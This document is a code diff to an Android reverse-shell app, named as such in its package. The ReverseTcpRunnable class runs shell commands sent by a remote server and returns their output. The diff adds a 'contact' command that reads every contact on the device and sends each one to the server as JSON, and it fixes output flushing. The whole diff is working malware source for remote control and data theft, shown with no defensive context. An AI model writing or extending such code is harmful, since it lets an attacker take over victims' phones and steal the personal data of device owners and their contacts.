@@ -1,7 +1,13 @@
 package com.anythingintellect.androidreverseshell;
 
+import android.content.Context;
 import android.text.TextUtils;
 import android.util.Log;
+
+import com.anythingintellect.androidreverseshell.internalcmdutils.ContactHelper;
+
+import org.json.JSONArray;
+import org.json.JSONObject;
 
 import java.io.BufferedReader;
 import java.io.DataOutputStream;
@@ -20,6 +26,12 @@ public class ReverseTcpRunnable implements Runnable {
     int port = 443;
     private String directory = "/";
     private static final String CMD_CD = "cd";
+    private static final String CMD_CONTACT = "contact";
+    private Context mContext;
+
+    public ReverseTcpRunnable(Context context) {
+        this.mContext = context;
+    }
 
     @Override
     public void run() {
@@ -76,6 +88,7 @@ public class ReverseTcpRunnable implements Runnable {
 
     private void shotEndResponse(DataOutputStream toServer) {
         try {
+            toServer.flush();
             toServer.write("$endRes$".getBytes("UTF-8"));
         } catch (IOException e) {
             e.printStackTrace();
@@ -129,8 +142,8 @@ public class ReverseTcpRunnable implements Runnable {
             String line = "";
             while ((line = reader.readLine()) != null) {
                 shotResponseLine(line + "\n", toServer);
-                process.waitFor();
             }
+            process.waitFor();
         } catch (IOException e) {
             e.printStackTrace();
         } catch (InterruptedException e) {
@@ -159,9 +172,24 @@ public class ReverseTcpRunnable implements Runnable {
                 shotResponseLine(res, toServer);
                 return true;
             }
+            case CMD_CONTACT: {
+                JSONArray contacts = ContactHelper.fetchContact(mContext);
+                shotResponseLine(contacts.length()+ " Contacts Found!", toServer);
+                shotResponseArray(contacts, toServer);
+                return true;
+            }
         }
         return false;
 
+    }
+
+    private void shotResponseArray(JSONArray array, DataOutputStream toServer) {
+        for (int i = 0; i < array.length(); i++) {
+            JSONObject item = (JSONObject) array.opt(i);
+            if (item != null) {
+                shotResponseLine(item.toString()+"\n", toServer);
+            }
+        }
     }
 
 
